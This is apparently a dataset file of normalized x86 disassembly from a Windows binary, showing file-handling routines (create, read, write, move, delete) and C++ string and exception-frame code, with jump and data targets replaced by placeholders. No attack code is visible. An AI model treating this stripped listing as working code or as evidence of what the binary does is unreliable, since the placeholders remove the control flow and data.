add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0x4bc ]
sar ecx 0x1
push ecx
push esi
mov ecx edx
call sub_10009730
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4b8 ]
call sub_1003c1b0
add esp 0x18
mov [ ebp - 0x4 ] 0x1
mov ecx edi
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x4a4 ] 0x10
jb r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
push ecx
push edx
mov ecx edi
call sub_10005470
cmp [ ebp - 0x4c4 ] 0x0
mov [ ebp - 0x4a4 ] 0xf
mov [ ebp - 0x4a8 ] 0x0
mov [ ebp - 0x4b8 ] 0x0
je r-xdata
push [ ebp - 0x4b8 ]
call j_sub_1003f3e3#2
add esp 0x4
mov esi [ ebp - 0x4c8 ]
lea eax [ ebp - 0x488 ]
push esi
push [ ebp - 0x4c0 ]
push eax
call sub_10010b00
add esp 0xc
cmp [ ebp - 0x488 ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
lea ecx [ ebp - 0x488 ]
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
push ecx
push ebx
mov ecx edi
call sub_10005470
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ ebp - 0x488 ]
mov ecx edi
push eax
call sub_10005470
sub esp 0x18
mov eax esp
mov [ ebp - 0x4cc ] esp
push 0x1
push esi
push eax
call sub_10007990
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4a0 ]
call sub_1003c1b0
add esp 0x18
mov [ ebp - 0x4 ] 0x3
mov ecx edi
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x48c ] 0x10
jb r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
mov ecx edi
call sub_10005470
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x48c ] 0xf
mov [ ebp - 0x490 ] 0x0
mov [ ebp - 0x4a0 ] 0x0
push [ ebp - 0x4a0 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10010b20
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d79b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x78 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x4c ]
push 0x1
push eax
call sub_100080c0
mov [ esp + 0x80 ] 0x0
cmp [ esp + 0x54 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ esi - 0x44 ]
lea ecx [ esi - 0x44 ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x50 ]
sub esp 0x18
mov esi esp
mov [ esp + 0x2c ] esp
mov [ esp + 0x30 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x98 ] 0x1
push ebx
push [ esp + 0x34 ]
mov [ esp + 0xa0 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
mov ebx [ rw-data ]
mov edi 0x8
mov eax [ esi - 0x10 ]
mov ecx 0x9
test al 0x1
cmovne edi ecx
test al 0x2
je r-xdata
mov ecx 0x27
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ esp + 0x80 ] 0xffffffff
mov [ esp + 0x4c ] r--data
mov [ esp + 0x80 ] 0x8
cmp [ esp + 0x68 ] 0x0
jbe r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x2c ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esi - 0x40 ]
push eax
call sub_10003a20
mov [ esp + 0x98 ] 0x2
mov [ esp + 0x98 ] 0x0
lea ecx [ esp + 0x4c ]
call sub_10007be0
mov [ esp + 0x98 ] 0x3
mov ecx esp
mov [ esp + 0x2c ] esp
xor eax eax
push 0xffffffff
push eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
lea eax [ esi - 0x28 ]
push eax
call sub_10003a20
mov [ esp + 0x98 ] 0x4
mov [ esp + 0x98 ] 0x3
lea ecx [ esp + 0x34 ]
call sub_10007be0
add esp 0x18
mov [ esp + 0x80 ] 0x5
lea ecx [ esp + 0x1c ]
cmp [ esp + 0x30 ] 0x8
lea eax [ esp + 0x34 ]
push edi
cmovae ecx [ esp + 0x20 ]
cmp [ esp + 0x4c ] 0x8
push ecx
cmovae eax [ esp + 0x3c ]
push eax
call [ MoveFileExW@IAT ]
test eax eax
je r-xdata
or edi 0x2
mov [ esp + 0x80 ] 0xffffffff
cmp [ esp + 0x6c ] 0x8
jb r-xdata
cmp [ esp + 0x6c ] 0x8
lea eax [ esp + 0x58 ]
cmovae eax [ esp + 0x58 ]
push eax
call [ SetCurrentDirectoryW@IAT ]
call [ GetLastError@IAT ]
push eax
mov eax [ esi - 0x44 ]
lea ecx [ esi - 0x44 ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
push 0x94
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x14 ] edi
mov [ esp + 0x80 ] 0x6
test edi edi
je r-xdata
xor eax eax
mov [ esp + 0x6c ] 0x7
mov [ esp + 0x58 ] ax
mov eax esi
mov [ esp + 0x68 ] 0x0
mov ecx [ esp + 0x78 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x60 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x1c ] ax
mov [ esp + 0x80 ] al
cmp [ esp + 0x48 ] 0x8
jb r-xdata
push [ esp + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
xor edi edi
mov ecx [ esi - 0x44 ]
mov ecx [ ecx + 0x8 ]
add ecx 0xffffffbc
add ecx esi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx edi
call sub_10018c90
mov edi eax
jmp r-xdata
xor eax eax
mov [ esp + 0x48 ] 0x7
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x34 ] ax
push [ esp + 0x34 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
jmp r-xdata
xor esi esi
jmp r-xdata
mov [ esp + 0x80 ] 0x5
sub esp 0x18
mov ecx esp
mov [ esp + 0x2c ] esp
push ebx
call sub_10001820
mov [ esp + 0x98 ] 0x7
mov [ esp + 0x98 ] 0x5
mov ecx edi
call sub_1000a260
test edi edi
jne r-xdata
mov [ esp + 0x80 ] 0x3
cmp [ esp + 0x30 ] 0x8
jb r-xdata
sub_10010e60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c889
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov esi [ ebp + 0x8 ]
add ecx 0x8
push 0xffffffff
push eax
push ecx
mov [ esi + 0x14 ] 0x7
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
call sub_10003a20
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10010ef0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d820
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x404c
call sub_10048ab0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4048 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4060 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x30 ]
push 0x1
push eax
call sub_100080c0
mov [ esp + 0x4068 ] 0x0
cmp [ esp + 0x38 ] 0x0
je r-xdata
cmp [ esi - 0x10 ] 0x8
lea eax [ esi - 0x24 ]
jb r-xdata
mov eax [ esi - 0x2c ]
lea ecx [ esi - 0x2c ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x34 ]
sub esp 0x18
mov esi esp
mov [ esp + 0x2c ] esp
mov [ esp + 0x28 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x4080 ] 0x1
push ebx
push [ esp + 0x2c ]
mov [ esp + 0x4088 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
push eax
call [ DeleteFileW@IAT ]
sub esp 0x18
lea ecx [ esi - 0x2c ]
mov eax esp
mov [ esp + 0x28 ] esp
push eax
call sub_10010e60
mov [ esp + 0x4080 ] 0x2
mov [ esp + 0x4080 ] 0x0
lea ecx [ esp + 0x30 ]
call sub_10007be0
add esp 0x18
mov [ esp + 0x4068 ] 0x3
lea eax [ esp + 0x18 ]
cmp [ esp + 0x2c ] 0x8
push 0x0
cmovae eax [ esp + 0x1c ]
push 0x0
push 0x4
push 0x0
push 0x0
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov ebx eax
mov [ esp + 0x14 ] ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax ]
mov [ esp + 0x4068 ] 0xffffffff
mov [ esp + 0x30 ] r--data
mov [ esp + 0x4068 ] 0x6
cmp [ esp + 0x4c ] 0x0
jbe r-xdata
push 0x0
push ebx
call [ GetFileSize@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
mov eax [ esi - 0x2c ]
lea ecx [ esi - 0x2c ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
jmp r-xdata
mov [ esp + 0x4068 ] 0xffffffff
cmp [ esp + 0x50 ] 0x8
jb r-xdata
cmp [ esp + 0x50 ] 0x8
lea eax [ esp + 0x3c ]
cmovae eax [ esp + 0x3c ]
push eax
call [ SetCurrentDirectoryW@IAT ]
mov ecx [ esi - 0x28 ]
xor edi edi
mov eax [ ecx ]
call [ eax + 0xc ]
test eax eax
je r-xdata
push ebx
call [ CloseHandle@IAT ]
mov eax [ esi - 0x2c ]
lea ecx [ esi - 0x2c ]
push 0x0
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007eb0
mov esi eax
jmp r-xdata
mov [ esp + 0x4068 ] 0x0
cmp [ esp + 0x2c ] 0x8
jb r-xdata
xor eax eax
mov [ esp + 0x50 ] 0x7
mov [ esp + 0x3c ] ax
mov eax esi
mov [ esp + 0x4c ] 0x0
mov ecx [ esp + 0x4060 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x4048 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x3c ]
call j_sub_1003f3e3#2
add esp 0x4
push ebx
call [ CloseHandle@IAT ]
push 0x94
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x10 ] edi
mov [ esp + 0x4068 ] 0x4
test edi edi
je r-xdata
jmp r-xdata
xor eax eax
mov [ esp + 0x2c ] 0x7
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] ax
push [ esp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
xor edi edi
mov ecx [ esi - 0x2c ]
mov ecx [ ecx + 0x8 ]
add ecx 0xffffffd4
add ecx esi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx edi
call sub_10018c90
mov edi eax
jmp r-xdata
mov ecx [ esi - 0x28 ]
lea edx [ esp + 0x54 ]
push 0x4000
push edx
push edi
mov eax [ ecx ]
call [ eax + 0x14 ]
mov ebx eax
mov [ esp + 0x10 ] 0x0
push 0x0
lea eax [ esp + 0x14 ]
push eax
push ebx
lea eax [ esp + 0x60 ]
push eax
push [ esp + 0x24 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
sub esp 0x18
mov ecx esp
mov [ esp + 0x28 ] esp
push eax
call sub_10001820
mov [ esp + 0x4080 ] 0x5
mov [ esp + 0x4080 ] 0x3
mov ecx edi
call sub_1000a260
test edi edi
jne r-xdata
mov ecx 0x27
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov [ esp + 0x4068 ] 0x3
cmp [ rw-data ] 0x0
jne r-xdata
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
cmp [ esi - 0x10 ] 0x8
lea eax [ esi - 0x24 ]
jb r-xdata
cmp [ esp + 0x10 ] ebx
jne r-xdata
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
xor esi esi
jmp r-xdata
push eax
call [ DeleteFileW@IAT ]
mov eax [ esi - 0x2c ]
lea ecx [ esi - 0x2c ]
push 0x0
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007eb0
mov esi eax
jmp r-xdata
mov eax [ eax ]
mov ecx [ esi - 0x28 ]
add edi ebx
mov eax [ ecx ]
call [ eax + 0xc ]
cmp edi eax
jb r-xdata
mov ebx [ esp + 0x14 ]
sub_10011280
push ebp
mov ebp esp
push 0xffffffff
push sub_1004d863
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx [ edi - 0x10 ]
mov ecx [ ecx + 0x8 ]
add ecx 0xfffffff0
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x8 ]
add eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] 0xffffffff
sub esp 0x18
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ ebp + 0x8 ] esp
push eax
mov edx [ ecx ]
call [ edx + 0x14 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_100190c0
test esi esi
jne r-xdata
sub_10011350
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004d934
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x98 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xb0 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ esp + 0x14 ] edi
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x84 ]
push 0x1
push eax
call sub_100080c0
mov [ esp + 0xb8 ] 0x0
cmp [ esp + 0x8c ] 0x0
je r-xdata
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x38 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ edi - 0x34 ]
push eax
call sub_10003a20
mov [ esp + 0xd0 ] 0x2
mov [ esp + 0xd0 ] 0x0
lea ecx [ esp + 0x84 ]
call sub_10007be0
add esp 0x18
mov [ esp + 0xb8 ] 0x3
lea eax [ esp + 0x6c ]
cmp [ esp + 0x80 ] 0x8
push 0x0
cmovae eax [ esp + 0x70 ]
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov ecx eax
mov [ esp + 0x18 ] ecx
cmp ecx 0xffffffff
jne r-xdata
mov eax [ edi - 0x38 ]
lea ecx [ edi - 0x38 ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x88 ]
sub esp 0x18
mov esi esp
mov [ esp + 0x2c ] esp
mov [ esp + 0x30 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0xd0 ] 0x1
push ebx
push [ esp + 0x34 ]
mov [ esp + 0xd8 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
mov edx [ edi - 0x1c ]
xor eax eax
mov ebx [ edi - 0x10 ]
test edx edx
jne r-xdata
call [ GetLastError@IAT ]
push eax
jmp r-xdata
mov [ esp + 0xb8 ] 0xffffffff
mov [ esp + 0x84 ] r--data
mov [ esp + 0xb8 ] 0x11
cmp [ esp + 0xa0 ] 0x0
jbe r-xdata
cmp edx 0xff
jne r-xdata
mov eax [ edi - 0x14 ]
jmp r-xdata
mov eax [ edi - 0x38 ]
lea ecx [ edi - 0x38 ]
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
jmp r-xdata
mov [ esp + 0xb8 ] 0xffffffff
cmp [ esp + 0xa4 ] 0x8
jb r-xdata
cmp [ esp + 0xa4 ] 0x8
lea eax [ esp + 0x90 ]
cmovae eax [ esp + 0x90 ]
push eax
call [ SetCurrentDirectoryW@IAT ]
cmp ebx 0x40c8
jbe r-xdata
push 0x0
push ecx
call [ GetFileSize@IAT ]
mov ecx [ esp + 0x18 ]
cmp eax ebx
jbe r-xdata
mov [ esp + 0xb8 ] 0x0
cmp [ esp + 0x80 ] 0x8
jb r-xdata
xor eax eax
mov [ esp + 0xa4 ] 0x7
mov [ esp + 0x90 ] ax
mov eax esi
mov [ esp + 0xa0 ] 0x0
mov ecx [ esp + 0xb0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x98 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x90 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x0
push 0x0
push eax
push ecx
call [ SetFilePointer@IAT ]
push ebx
call sub_1003c61a
add esp 0x4
mov [ esp + 0x1c ] 0x0
mov esi eax
lea eax [ esp + 0x1c ]
mov [ esp + 0x20 ] esi
push 0x0
push eax
push ebx
mov ebx [ esp + 0x24 ]
push esi
push ebx
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push ecx
call [ CloseHandle@IAT ]
push 0x57
jmp r-xdata
xor eax eax
sub eax ebx
jmp r-xdata
xor eax eax
mov [ esp + 0x80 ] 0x7
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x6c ] ax
push [ esp + 0x6c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x50 ] 0xf
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x3c ] 0x0
mov [ esp + 0xb8 ] 0x4
mov eax [ edi - 0x18 ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push [ esp + 0x20 ]
mov esi eax
call j_sub_1003f3e3
add esp 0x4
push ebx
call [ CloseHandle@IAT ]
push esi
cmp eax 0x1
jne r-xdata
sub esp 0x18
mov ecx esp
mov [ esp + 0x2c ] esp
push [ esp + 0x34 ]
push esi
call sub_10006630
mov [ esp + 0xd0 ] 0x5
mov [ esp + 0xd0 ] 0x4
lea ecx [ esp + 0x6c ]
call sub_1003bfd0
mov [ esp + 0xd0 ] 0x6
lea eax [ esp + 0x6c ]
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_10003640
mov [ esp + 0xd0 ] 0x7
mov [ esp + 0xd0 ] 0x6
lea ecx [ esp + 0x3c ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0xb8 ] 0x8
lea ecx [ esp + 0x3c ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0xb8 ] 0x6
jmp r-xdata
xor ebx ebx
cmp [ esp + 0x1c ] ebx
jbe r-xdata
sub esp 0x18
mov ecx esp
mov [ esp + 0x2c ] esp
push [ esp + 0x34 ]
push esi
call sub_10006630
mov [ esp + 0xd0 ] 0x9
mov [ esp + 0xd0 ] 0x4
lea ecx [ esp + 0x6c ]
call sub_1003c060
mov [ esp + 0xd0 ] 0xa
lea eax [ esp + 0x6c ]
mov ecx esp
mov [ esp + 0x2c ] esp
push eax
call sub_10003640
mov [ esp + 0xd0 ] 0xb
mov [ esp + 0xd0 ] 0xa
lea ecx [ esp + 0x3c ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0xb8 ] 0xc
lea ecx [ esp + 0x3c ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0xb8 ] 0xa
lea ecx [ esp + 0x24 ]
call sub_10001880
mov [ esp + 0xb8 ] 0x4
lea ecx [ esp + 0x54 ]
call sub_100036b0
jmp r-xdata
push esi
call j_sub_1003f3e3
add esp 0x4
push [ esp + 0x18 ]
call [ CloseHandle@IAT ]
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x14 ] esi
mov [ esp + 0xb8 ] 0xf
test esi esi
je r-xdata
mov edi esi
lea eax [ esp + 0x24 ]
sub edi eax
xor edi edi
mov ecx [ edi - 0x38 ]
add edi 0xffffffc8
mov ecx [ ecx + 0x8 ]
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov edi eax
jmp r-xdata
mov edx 0xf
mov [ esp + 0x38 ] 0x0
lea eax [ ebx + esi ]
mov [ esp + 0x38 ] edx
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
test eax eax
je r-xdata
test bl 0xf
jne r-xdata
mov eax [ edi ]
mov esi [ eax + 0x8 ]
add esi edi
xor esi esi
jmp r-xdata
mov [ esp + 0xb8 ] 0x4
sub esp 0x18
mov ecx esp
mov [ esp + 0x2c ] esp
lea eax [ esp + 0x54 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0xd0 ] 0x10
mov [ esp + 0xd0 ] 0x4
mov ecx edi
call sub_1000a260
test edi edi
jne r-xdata
mov al [ eax ]
cmp edx 0x10
mov [ esp + 0x24 ] al
lea eax [ esp + 0x24 ]
cmovae eax [ esp + 0x24 ]
mov [ esp + 0x34 ] 0x1
mov [ eax + 0x1 ] 0x0
lea ecx [ esp + 0x24 ]
cmp eax ecx
jb r-xdata
push r--data
lea ecx [ esp + 0x40 ]
call sub_10005430
mov [ esp + 0x50 ] 0xf
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x3c ] 0x0
push [ esp + 0x3c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0xb8 ] 0x3
cmp [ esp + 0x50 ] 0x10
jb r-xdata
push r--data
lea ecx [ esp + 0x40 ]
mov [ esp + 0x6c ] 0xf
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x58 ] 0x0
call sub_10005430
mov [ esp + 0xb8 ] 0x4
cmp [ esp + 0x38 ] 0x10
jb r-xdata
push [ esp + 0x54 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp ecx eax
jbe r-xdata
inc ebx
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
cmp ebx [ esp + 0x1c ]
jb r-xdata
push [ esp + 0x24 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x1
lea eax [ edi + ebx ]
push eax
mov eax ecx
push eax
call sub_100018b0
jmp r-xdata
test ebx ebx
je r-xdata
mov edi [ esp + 0x14 ]
mov [ esp + 0xb8 ] 0xd
lea edx [ esp + 0x24 ]
lea ecx [ esp + 0x54 ]
call sub_1003b670
mov [ esp + 0xb8 ] 0xe
lea ecx [ esp + 0x3c ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0xb8 ] 0xd
cmp [ esp + 0x68 ] 0x10
jb r-xdata
sub_100119b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004da0d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x500
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4f8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x510 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x80 ]
push 0x1
push eax
call sub_100080c0
mov [ esp + 0x518 ] 0x0
lea ecx [ edi - 0x2c ]
cmp [ esp + 0x88 ] 0x0
je r-xdata
sub esp 0x18
mov eax esp
mov [ esp + 0x28 ] esp
push eax
call sub_10009aa0
mov [ esp + 0x530 ] 0x2
mov [ esp + 0x530 ] 0x0
lea ecx [ esp + 0x50 ]
call sub_10007be0
mov [ esp + 0x530 ] 0x3
mov esi esp
cmp [ esp + 0x64 ] 0x8
lea edx [ esp + 0x50 ]
mov [ esp + 0x38 ] 0x0
cmovae edx [ esp + 0x50 ]
xor eax eax
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov [ esp + 0x28 ] esp
cmp [ edx ] ax
jne r-xdata
mov eax [ edi - 0x2c ]
mov eax [ eax + 0x8 ]
add ecx eax
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
mov ecx [ esp + 0x84 ]
sub esp 0x18
mov esi esp
mov [ esp + 0x28 ] esp
mov [ esp + 0x40 ] eax
mov ebx edx
mov edi [ ecx ]
push esi
call [ edi + 0x14 ]
mov [ esp + 0x530 ] 0x1
push ebx
push [ esp + 0x44 ]
mov [ esp + 0x538 ] 0x0
call sub_10008410
add esp 0x20
mov esi eax
jmp r-xdata
mov ecx edx
lea eax [ ecx + 0x2 ]
mov [ esp + 0x40 ] eax
xor ecx ecx
jmp r-xdata
mov [ esp + 0x518 ] 0xffffffff
mov [ esp + 0x80 ] r--data
mov [ esp + 0x518 ] 0xd
cmp [ esp + 0x9c ] 0x0
jbe r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ esp + 0x40 ]
sar ecx 0x1
push ecx
push edx
mov ecx esi
call sub_10009730
mov [ esp + 0x530 ] 0x4
lea eax [ esp + 0x44 ]
push eax
mov [ esp + 0x534 ] 0x3
call sub_10007ff0
test eax eax
je r-xdata
mov [ esp + 0x518 ] 0xffffffff
cmp [ esp + 0xa0 ] 0x8
jb r-xdata
cmp [ esp + 0xa0 ] 0x8
lea eax [ esp + 0x8c ]
cmovae eax [ esp + 0x8c ]
push eax
call [ SetCurrentDirectoryW@IAT ]
mov eax [ edi - 0x2c ]
lea ecx [ edi - 0x2c ]
push 0x3
mov eax [ eax + 0xc ]
add ecx eax
call sub_10007da0
mov esi eax
cmp [ esp + 0x2c ] 0x0
je r-xdata
xor eax eax
mov [ esp + 0xa0 ] 0x7
mov [ esp + 0x8c ] ax
mov eax esi
mov [ esp + 0x9c ] 0x0
mov ecx [ esp + 0x510 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x4f8 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ esp + 0x8c ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] ax
push [ esp + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x7c ] 0x7
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x68 ] ax
mov [ esp + 0x518 ] 0x5
cmp [ esp + 0x30 ] eax
je r-xdata
cmp [ esp + 0x34 ] 0x0
je r-xdata
inc [ esp + 0x14 ]
lea ecx [ esp + 0x18 ]
cmp [ esp + 0x4c ] 0x8
lea eax [ esp + 0x38 ]
push ecx
cmovae eax [ esp + 0x3c ]
